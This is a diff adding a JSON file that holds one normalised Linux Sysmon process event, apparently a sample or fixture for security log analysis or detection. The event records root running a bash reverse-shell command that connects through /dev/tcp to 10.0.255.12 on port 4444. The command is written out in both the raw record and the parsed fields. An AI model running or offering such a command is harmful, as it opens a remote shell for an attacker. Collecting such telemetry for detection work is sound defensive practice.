@@ -1,0 +1,39 @@
+{
+  "source_type": "linux",
+  "events": [
+    {
+      "ref": "E001",
+      "event_id": "1",
+      "source_kind": "linux",
+      "timestamp_raw": "2024-05-31T18:01:42.639983000Z",
+      "timestamp_utc": "2024-05-31T18:01:42.639983000Z",
+      "host": "ip-10-0-255-92",
+      "user": "root",
+      "raw": "2024-05-31T18:01:42.639983000Z linux_process_event ref=E001 provider=Linux-Sysmon event_id=1 record_id=905 host=ip-10-0-255-92 user=root image=/usr/bin/bash parent_image=/usr/bin/dash process_guid={ec227f46-1086-665a-0dcf-bdc908560000} command_line=\"bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53\" command_target_ip=10.0.255.12 command_target_port=4444 network_connection_outcome=unknown duplicate_source_lines=1,2",
+      "fields": {
+        "Provider": "Linux-Sysmon",
+        "EventID": "1",
+        "EventRecordID": "905",
+        "OriginalTimestampUTC": "2024-05-31T18:01:42.639983000Z",
+        "Image": "/usr/bin/bash",
+        "CommandLine": "bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53",
+        "ParentImage": "/usr/bin/dash",
+        "ParentCommandLine": "sh",
+        "ProcessId": "9414",
+        "ParentProcessId": "9413",
+        "ProcessGuid": "{ec227f46-1086-665a-0dcf-bdc908560000}",
+        "ParentProcessGuid": "{ec227f46-1086-665a-95e9-0765aa550000}",
+        "User": "root",
+        "CommandTargetIp": "10.0.255.12",
+        "CommandTargetPort": "4444",
+        "NetworkConnectionOutcome": "unknown",
+        "OriginalSourceLines": [
+          1,
+          2
+        ],
+        "DuplicateRawRecords": 2,
+        "Hashes": "MD5=11227b11f565de042c48654a241e9d1c,SHA256=2c336c63e26881d2f02f34379024e7c314bce572c08cbaa319bacbbec29f93ed"
+      }
+    }
+  ]
+}
